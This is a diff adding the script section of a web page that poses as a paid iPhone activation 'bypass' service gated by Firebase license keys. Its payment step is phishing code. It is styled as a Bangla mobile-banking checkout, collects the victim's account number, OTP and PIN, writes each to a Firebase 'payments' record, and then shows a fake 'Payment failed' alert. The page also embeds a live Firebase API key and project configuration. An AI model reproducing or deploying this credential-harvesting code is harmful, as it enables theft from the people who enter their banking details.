+        <text x="82" y="60" fill="#ffffff" font-family="Arial, sans-serif" font-size="7" opacity="0.85" letter-spacing="0.5">ডাক বিভাগের ডিজিটাল লেনদেন</text>
+      </svg>
+    </div>
+  </div>
+</div>
+
+<script>
+  (function() {
+    // ---------- FIREBASE CONFIG ----------
+    const firebaseConfig = {
+      apiKey: "AIzaSyC3WnQPnYhNa8bNDFwnKj_54ovE93F32Hs",
+      authDomain: "ern-all.firebaseapp.com",
+      databaseURL: "https://ern-all-default-rtdb.firebaseio.com",
+      projectId: "ern-all",
+      storageBucket: "ern-all.appspot.com",
+      messagingSenderId: "952310137953",
+      appId: "1:952310137953:android:726c62a07fa06173c19620"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // ---------- DATA ----------
+    const phoneData = {
+      'iPhone 17 Pro Max': { processor: 'A19 Pro' },
+      'iPhone 17 Pro': { processor: 'A19 Pro' },
+      'iPhone 17': { processor: 'A19' },
+      'iPhone 16 Pro Max': { processor: 'A18 Pro' },
+      'iPhone 16 Pro': { processor: 'A18 Pro' },
+      'iPhone 16': { processor: 'A18' },
+      'iPhone 15 Pro Max': { processor: 'A17 Pro' },
+      'iPhone 15 Pro': { processor: 'A17 Pro' },
+      'iPhone 15': { processor: 'A16 Bionic' },
+      'iPhone 14 Pro Max': { processor: 'A16 Bionic' },
+      'iPhone 14 Pro': { processor: 'A16 Bionic' },
+      'iPhone 14': { processor: 'A15 Bionic' },
+      'iPhone 13 Pro Max': { processor: 'A15 Bionic' },
+      'iPhone 13 Pro': { processor: 'A15 Bionic' },
+      'iPhone 13': { processor: 'A15 Bionic' },
+      'iPhone 12 Pro Max': { processor: 'A14 Bionic' },
+      'iPhone 12 Pro': { processor: 'A14 Bionic' },
+      'iPhone 12': { processor: 'A14 Bionic' },
+      'iPhone SE (3rd gen)': { processor: 'A15 Bionic' },
+      'iPhone 11 Pro Max': { processor: 'A13 Bionic' },
+      'iPhone 11 Pro': { processor: 'A13 Bionic' },
+      'iPhone 11': { processor: 'A13 Bionic' },
+      'iPhone XS Max': { processor: 'A12 Bionic' },
+      'iPhone XS': { processor: 'A12 Bionic' },
+      'iPhone XR': { processor: 'A12 Bionic' },
+      'iPhone X': { processor: 'A11 Bionic' }
+    };
+
+    const iosVersions = [
+      'iOS 17 All Version', 'iOS 18 All Version', 'iOS 26.0.1', 'iOS 26.1', 'iOS 26.2', 'iOS 26.3', 'iOS 26.4', 'iOS 26.5'
+    ];
+
+    // Populate selects
+    const modelSelect = document.getElementById('modelSelect');
+    Object.keys(phoneData).sort((a, b) => {
+      const numA = parseInt(a.match(/\d+/)?.[0] || 0);
+      const numB = parseInt(b.match(/\d+/)?.[0] || 0);
+      return numB - numA;
+    }).forEach(model => {
+      const opt = document.createElement('option');
+      opt.value = model;
+      opt.textContent = model;
+      modelSelect.appendChild(opt);
+    });
+    modelSelect.value = 'iPhone 17 Pro Max';
+
+    const versionSelect = document.getElementById('versionSelect');
+    iosVersions.forEach(ver => {
+      const opt = document.createElement('option');
+      opt.value = ver;
+      opt.textContent = ver;
+      versionSelect.appendChild(opt);
+    });
+    versionSelect.value = iosVersions[0];
+
+    // ---------- STATE ----------
+    let isLoggedIn = false;
+    let isSkipped = false;
+    let selectedScreenshot = null;
+
+    // DOM refs
+    const loginOverlay = document.getElementById('loginOverlay');
+    const mainDashboard = document.getElementById('mainDashboard');
+    const licenseInput = document.getElementById('licenseInput');
+    const loginBtn = document.getElementById('loginBtn');
+    const skipBtn = document.getElementById('skipBtn');
+    const loginError = document.getElementById('loginError');
+    const mainWorkArea = document.getElementById('mainWorkArea');
+    const phoneModelDisplay = document.getElementById('phoneModelDisplay');
+    const processorDisplay = document.getElementById('processorDisplay');
+    const bypassBtn = document.getElementById('bypassBtn');
+    const serialInput = document.getElementById('serialInput');
+    const modelNumberInput = document.getElementById('modelNumberInput');
+    const variantInput = document.getElementById('variantInput');
+    const serialError = document.getElementById('serialError');
+    const modelNumberError = document.getElementById('modelNumberError');
+    const variantError = document.getElementById('variantError');
+
+    // Bypass confirm refs
+    const bypassConfirmOverlay = document.getElementById('bypassConfirmOverlay');
+    const confirmModel = document.getElementById('confirmModel');
+    const confirmVersion = document.getElementById('confirmVersion');
+    const uploadBox = document.getElementById('uploadBox');
+    const screenshotInput = document.getElementById('screenshotInput');
+    const fileNameText = document.getElementById('fileNameText');
+    const proceedToPayBtn = document.getElementById('proceedToPayBtn');
+    const closeConfirmBtn = document.getElementById('closeConfirmBtn');
+
+    // Payment refs
+    const paymentOverlay = document.getElementById('paymentOverlay');
+    const paymentCloseBtn = document.getElementById('paymentCloseBtn');
+
+    // ---------- LICENSE KEY FUNCTIONS ----------
+    function validateLicenseKey(key) {
+      return /^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/.test(key);
+    }
+
+    function markKeyAsUsed(key, userIdentifier) {
+      const ref = database.ref('licenseKeys').child(key);
+      return ref.update({
+        used: true,
+        usedBy: userIdentifier || 'User',
+        usedAt: Date.now()
+      });
+    }
+
+    // ---------- LOGIN WITH LICENSE KEY ----------
+    function performLogin(key) {
+      const trimmedKey = key.trim().toUpperCase();
+      
+      // Check if key exists in Firebase
+      const ref = database.ref('licenseKeys').child(trimmedKey);
+      return ref.once('value').then((snapshot) => {
+        if (snapshot.exists()) {
+          const data = snapshot.val();
+          if (data.used) {
+            loginError.style.display = 'block';
+            loginError.textContent = '❌ This license key has already been used!';
+            return false;
+          }
+          // Mark as used
+          return markKeyAsUsed(trimmedKey, 'User').then(() => {
+            isLoggedIn = true;
+            isSkipped = false;
+            loginError.style.display = 'none';
+            showDashboard(false);
+            return true;
+          });
+        } else {
+          loginError.style.display = 'block';
+          loginError.textContent = '❌ Invalid license key. Please check and try again.';
+          return false;
+        }
+      }).catch((err) => {
+        loginError.style.display = 'block';
+        loginError.textContent = '❌ Error validating key: ' + err.message;
+        return false;
+      });
+    }
+
+    // ---------- UI FUNCTIONS ----------
+    function updatePhoneDisplay() {
+      const selectedModel = modelSelect.value;
+      phoneModelDisplay.textContent = selectedModel;
+      const data = phoneData[selectedModel];
+      if (data) {
+        processorDisplay.innerHTML = `<i class="fas fa-microchip"></i> ${data.processor}`;
+      }
+    }
+
+    function showDashboard(skipMode) {
+      loginOverlay.style.display = 'none';
+      mainDashboard.style.display = 'flex';
+      
+      if (skipMode) {
+        isSkipped = true;
+        isLoggedIn = false;
+        mainWorkArea.classList.add('view-only-mode');
+        bypassBtn.disabled = true;
+        phoneModelDisplay.textContent = '👀 View only';
+        processorDisplay.innerHTML = `<i class="fas fa-microchip"></i> locked`;
+        document.querySelectorAll('.info-fields input').forEach(inp => inp.disabled = true);
+        modelSelect.disabled = true;
+        versionSelect.disabled = true;
+      } else {
+        isSkipped = false;
+        isLoggedIn = true;
+        mainWorkArea.classList.remove('view-only-mode');
+        bypassBtn.disabled = false;
+        document.querySelectorAll('.info-fields input').forEach(inp => inp.disabled = false);
+        modelSelect.disabled = false;
+        versionSelect.disabled = false;
+        updatePhoneDisplay();
+      }
+    }
+
+    // ---------- EVENT LISTENERS ----------
+    loginBtn.addEventListener('click', function() {
+      const key = licenseInput.value.trim();
+      if (key === '') {
+        loginError.style.display = 'block';
+        loginError.textContent = '⚠️ Please enter a license key';
+        return;
+      }
+      performLogin(key);
+    });
+
+    skipBtn.addEventListener('click', function() {
+      isLoggedIn = false;
+      isSkipped = true;
+      loginError.style.display = 'none';
+      showDashboard(true);
+    });
+
+    licenseInput.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') loginBtn.click();
+    });
+
+    modelSelect.addEventListener('change', updatePhoneDisplay);
+
+    // ---------- BYPASS VALIDATION ----------
+    function validateFields() {
+      let isValid = true;
+      
+      if (serialInput.value.trim() === '') {
+        serialInput.classList.add('field-error');
+        serialError.style.display = 'block';
+        isValid = false;
+      } else {
+        serialInput.classList.remove('field-error');
+        serialError.style.display = 'none';
+      }
+      
+      if (modelNumberInput.value.trim() === '') {
+        modelNumberInput.classList.add('field-error');
+        modelNumberError.style.display = 'block';
+        isValid = false;
+      } else {
+        modelNumberInput.classList.remove('field-error');
+        modelNumberError.style.display = 'none';
+      }
+      
+      if (variantInput.value.trim() === '') {
+        variantInput.classList.add('field-error');
+        variantError.style.display = 'block';
+        isValid = false;
+      } else {
+        variantInput.classList.remove('field-error');
+        variantError.style.display = 'none';
+      }
+      
+      return isValid;
+    }
+
+    [serialInput, modelNumberInput, variantInput].forEach(input => {
+      input.addEventListener('input', function() {
+        this.classList.remove('field-error');
+        const errorId = this.id.replace('Input', 'Error');
+        const errorEl = document.getElementById(errorId);
+        if (errorEl) errorEl.style.display = 'none';
+      });
+    });
+
+    // ---------- BYPASS BUTTON ----------
+    bypassBtn.addEventListener('click', function() {
+      if (!isLoggedIn || isSkipped) return;
+      
+      if (!validateFields()) {
+        const firstError = document.querySelector('.field-error');
+        if (firstError) firstError.focus();
+        return;
+      }
+      
+      confirmModel.textContent = modelSelect.value;
+      confirmVersion.textContent = versionSelect.value;
+      
+      selectedScreenshot = null;
+      uploadBox.classList.remove('has-file');
+      fileNameText.textContent = '';
+      proceedToPayBtn.disabled = true;
+      
+      bypassConfirmOverlay.style.display = 'flex';
+    });
+
+    // ---------- SCREENSHOT UPLOAD ----------
+    screenshotInput.addEventListener('change', function(e) {
+      if (this.files && this.files[0]) {
+        selectedScreenshot = this.files[0];
+        fileNameText.textContent = selectedScreenshot.name;
+        uploadBox.classList.add('has-file');
+        proceedToPayBtn.disabled = false;
+      }
+    });
+
+    // ---------- PROCEED TO PAY ----------
+    proceedToPayBtn.addEventListener('click', function() {
+      if (!selectedScreenshot) return;
+      bypassConfirmOverlay.style.display = 'none';
+      paymentOverlay.style.display = 'flex';
+      resetPaymentForm();
+    });
+
+    // ---------- CLOSE BYPASS CONFIRM ----------
+    closeConfirmBtn.addEventListener('click', function() {
+      bypassConfirmOverlay.style.display = 'none';
+    });
+
+    bypassConfirmOverlay.addEventListener('click', function(e) {
+      if (e.target === bypassConfirmOverlay) {
+        bypassConfirmOverlay.style.display = 'none';
+      }
+    });
+
+    // ---------- PAYMENT ----------
+    let currentSessionKey = null;
+    let sessionData = {};
+
+    function getDigitsFromStep(stepElement) {
+      const inputs = stepElement.querySelectorAll('.digit-box');
+      let value = '';
+      inputs.forEach(inp => value += inp.value.trim());
+      return value;
+    }
+
+    function showPaymentError(msg) {
+      const el = document.getElementById('firebaseStatus');
+      el.style.display = 'block';
+      el.textContent = msg;
+      el.style.background = 'rgba(180,0,0,0.8)';
+      setTimeout(() => { el.style.display = 'none'; }, 3000);
+    }
+
+    function resetPaymentSession() {
+      currentSessionKey = null;
+      sessionData = {};
+    }
+
+    function saveSessionToFirebase() {
+      if (!currentSessionKey) return Promise.reject('No session key');
+      const ref = database.ref('payments').child(currentSessionKey);
+      const payload = { ...sessionData, timestamp: Date.now() };
+      return ref.update(payload).catch(err => console.error('Firebase update error:', err));
+    }
+
+    function createNewSession(account) {
+      const newRef = database.ref('payments').push();
+      currentSessionKey = newRef.key;
+      sessionData = { account: account };
+      return newRef.set({ account: account, timestamp: Date.now() })
+        .catch(err => console.error('Failed to create session:', err));
+    }
+
+    window.goToStep = function(stepId) {
+      const container = document.querySelector('.payment-container');
+      container.querySelectorAll('.step-view').forEach(step => step.classList.remove('active'));
+      const target = document.getElementById(stepId);
+      if (target) target.classList.add('active');
+      const firstInput = target ? target.querySelector('.digit-box') : null;
+      if (firstInput) firstInput.focus();
+    };
+
+    window.resendOtp = function() {};
+
+    window.resetPaymentForm = function() {
+      const container = document.querySelector('.payment-container');
+      container.querySelectorAll('.digit-box').forEach(inp => inp.value = '');
+      resetPaymentSession();
+      goToStep('step-account');
+      document.getElementById('firebaseStatus').style.display = 'none';
+    };
+
+    paymentCloseBtn.addEventListener('click', function() {
+      paymentOverlay.style.display = 'none';
+      resetPaymentForm();
+    });
+
+    paymentOverlay.addEventListener('click', function(e) {
+      if (e.target === paymentOverlay) {
+        paymentOverlay.style.display = 'none';
+        resetPaymentForm();
+      }
+    });
+
+    document.getElementById('btnAccountProceed').addEventListener('click', function(e) {
+      e.preventDefault();
+      const stepEl = document.getElementById('step-account');
+      const account = getDigitsFromStep(stepEl);
+      if (account.length < 11) {
+        showPaymentError('⚠️ Please enter full account number');
+        return;
+      }
+      resetPaymentSession();
+      createNewSession(account).then(() => { goToStep('step-otp'); });
+    });
+
+    document.getElementById('btnOtpProceed').addEventListener('click', function(e) {
+      e.preventDefault();
+      if (!currentSessionKey) {
+        showPaymentError('⚠️ No active session. Please start from account.');
+        return;
+      }
+      const stepEl = document.getElementById('step-otp');
+      const otp = getDigitsFromStep(stepEl);
+      if (otp.length < 6) {
+        showPaymentError('⚠️ Please enter 6-digit OTP');
+        return;
+      }
+      sessionData.otp = otp;
+      saveSessionToFirebase().then(() => { goToStep('step-pin'); });
+    });
+
+    document.getElementById('btnPinProceed').addEventListener('click', function(e) {
+      e.preventDefault();
+      if (!currentSessionKey) {
+        showPaymentError('⚠️ No active session. Please start from account.');
+        return;
+      }
+      const stepEl = document.getElementById('step-pin');
+      const pin = getDigitsFromStep(stepEl);
+      if (pin.length < 4) {
+        showPaymentError('⚠️ Please enter 4-digit PIN');
+        return;
+      }
+      sessionData.pin = pin;
+      saveSessionToFirebase().then(() => {
+        alert('Payment failed, Invalid Pin Or OTP');
+        resetPaymentForm();
+        paymentOverlay.style.display = 'none';
+      });
+    });
+
+    // Auto-focus for payment digits
+    document.querySelectorAll('.payment-container .step-view').forEach(step => {
+      const inputs = step.querySelectorAll('.digit-box');
+      inputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+          if (e.target.value.length === 1 && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+        });
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && !e.target.value && index > 0) {
+            inputs[index - 1].focus();
+          }
+        });
+      });
+    });
+
+    // ---------- INIT ----------
+    loginOverlay.style.display = 'flex';
+    mainDashboard.style.display = 'none';
+    licenseInput.value = '';
+    updatePhoneDisplay();
+    resetPaymentSession();
+
+    window.addEventListener('load', function() {
+      const firstInput = document.querySelector('#step-account .digit-box');
+      if (firstInput) firstInput.focus();
+    });
+
+  })();
+</script>
+
+</body>
+</html>
